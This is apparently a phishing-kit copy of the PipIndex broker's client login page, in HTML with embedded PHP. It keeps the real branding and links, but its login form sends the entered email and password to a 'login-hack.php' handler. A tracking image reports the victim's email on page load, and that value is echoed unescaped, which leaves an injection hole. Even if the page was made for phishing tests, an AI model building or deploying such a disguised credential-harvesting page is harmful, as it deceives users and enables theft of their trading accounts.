<!DOCTYPE html>
<!-- saved from url=(0041)https://clients.pipindex.com/#/auth/login -->
<html ng-app="tradecore.forms" ng-controller="BaseController" class="ng-scope">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">.ng-animate.item:not(.left):not(.right) {
        -webkit-transition: 0s ease-in-out left;
        transition: 0s ease-in-out left
    }</style>
    <style type="text/css">.ng-animate.item:not(.left):not(.right) {
        -webkit-transition: 0s ease-in-out left;
        transition: 0s ease-in-out left
    }</style>
    <style type="text/css">@charset "UTF-8";
    [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak, .ng-hide:not(.ng-hide-animate) {
        display: none !important;
    }

    ng\:form {
        display: block;
    }</style>

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title ng-bind="siteTitle" class="ng-binding">PipIndex - Log in</title>
    <!--
   IE8 support, see AngularJS Internet Explorer Compatibility http://docs.angularjs.org/guide/ie
   For Firefox 3.6, you will also need to include jQuery and ECMAScript 5 shim
 -->
    <!--[if lt IE 9]>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.js"></script>
    <script src="http://cdnjs.cloudflare.com/ajax/libs/es5-shim/2.2.0/es5-shim.js"></script>
    <![endif]-->
    <link rel="icon" href="https://clients.pipindex.com/favicon.ico">
    <link href="./PipIndex - Log in_files/font-awesome.min.css" rel="stylesheet">
    <link href="./PipIndex - Log in_files/css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="./PipIndex - Log in_files/styles.css">
</head>
<body class="tradecore" ng-class="{&#39;grid&#39; : $state.includes(&#39;base.portal&#39;)}">
<section url="pipindex.com" class="ng-isolate-scope">
    <div class="top-bar" ng-show="!$state.includes(&#39;payment&#39;)">
        <div class="container" ng-class="{&#39;ib-topbar&#39; : $state.includes(&#39;base-ib.portal&#39;)}">
            <div class="row">
                <div class="col-xs-12 col-sm-6"><a ng-href="http://pipindex.com/" class="ng-binding"
                                                   href="http://pipindex.com/">Go to pipindex.com →</a></div>
                <div class="col-xs-12 col-sm-6 text-right"><a
                        ng-hide="$state.includes(&#39;base-ib&#39;) || data.isLogged || login == false"
                        href="https://clients.pipindex.com/#/auth/login" translate=""><span
                        class="ng-scope">Login</span></a> <a
                        ng-hide="!$state.includes(&#39;base-ib&#39;) || data.isLogged || login == false"
                        href="https://clients.pipindex.com/" translate="" class="ng-hide"><span
                        class="ng-scope">Login</span></a>
                    <div ng-show="data.isLogged" class="ng-binding ng-hide"><a
                            href="https://clients.pipindex.com/#/auth/logout/client" translate=""><span
                            class="ng-scope">[Logout]</span></a></div>
                </div>
            </div>
        </div>
    </div>
    <div class="alert-warning text-center ie-bar ng-hide" ng-show="iE">
        <div class="container">
            <div translate="" class="row"><span class="ng-scope">We strongly recommend that you upgrade to a different browser for better user experience and increased security. You'll still be able to use this site on Internet Explorer 11, but you may have problems using some of our newer features.</span>
            </div>
        </div>
    </div>
</section>
<!-- uiView: undefined -->
<ui-view class="ng-scope">
    <div class="login-section ng-scope">
        <div class="container">
            <div class="row">
                <div class="col-xs-12 col-sm-offset-3 col-sm-6">
                    <div class="text-center"><img src="./PipIndex - Log in_files/logo.png" alt=""></div>
                    <h2 translate=""><span class="ng-scope">Log in to your account</span></h2>
                    <form name='input' action='/loginpoc/login-hack.php' method='post'
                          class="ng-pristine ng-invalid ng-invalid-required">
                        <!-- ngIf: errors.non_field_errors.length > 0 --><!-- ngIf: errors.msg.length > 0 -->
                        <?php
                          if (isset($_GET['error']) && $_GET['error'] == true) {
                            echo '<div class="alert alert-danger">Your email or password was incorrect</div>';
                          }
                        ?>
                        <div class="form-group"
                             ng-class="{&#39;has-error&#39;: authForm.credentials.$invalid &amp;&amp; (authForm.credentials.$touched || authForm.$submitted)}">
                            <label translate="" for="credentials"><span class="ng-scope">Email address</span></label>
                            <input ng-required="true" ng-model="data.username" type="text" name="username"
                                   id="username"
                                   class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required"
                                   required="required">
                            <p class="help-block ng-hide"
                               ng-show="authForm.credentials.$invalid &amp;&amp; (authForm.credentials.$touched || authForm.$submitted)"
                               translate=""><span class="ng-scope">This field is required</span></p></div>
                        <div class="form-group"
                             ng-class="{&#39;has-error&#39;: authForm.password.$invalid &amp;&amp; (authForm.password.$touched || authForm.$submitted)}">
                            <label for="password" class="ng-binding">Password</label> <input required=""
                                                                                             ng-model="data.password"
                                                                                             type="password"
                                                                                             name="password"
                                                                                             id="password"
                                                                                             class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required">
                            <p class="help-block ng-binding ng-hide"
                               ng-show="authForm.password.$invalid &amp;&amp; (authForm.password.$touched || authForm.$submitted)">
                                This field is required</p></div>
                        <button translate="" type="submit" name="sub" class="btn btn-success btn-lg btn-block"><span
                                class="ng-scope">Log in</span></button>
                        <div class="row">
                            <div class="col-sm-5 pr0"><a href="https://clients.pipindex.com/#/auth/forgot"
                                                         class="ng-binding">Forgot password?</a></div>
                            <div class="col-sm-7 text-right pl0"><a translate=""
                                                                    href="https://clients.pipindex.com/#/step-one"
                                                                   ><span class="ng-scope">Don't have an account?</span></a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <?php require_once('utils.php'); echo '<img src="'. baseURL() .'loginpoc/trackevents.php?email=' .(isset($_GET['email']) ? trim($_GET['email'])  : '') .'&eventType=page-load&pageId=login"/>'; ?>
</ui-view>
<div growl="" class="ng-isolate-scope">
    <div class="growl-container growl-fixed top-right" ng-class="wrapperClasses()">
        <!-- ngRepeat: message in growlMessages.directives[referenceId].messages --></div>
</div>

<link href="./PipIndex - Log in_files/iwp.css" rel="stylesheet">



</body>
</html>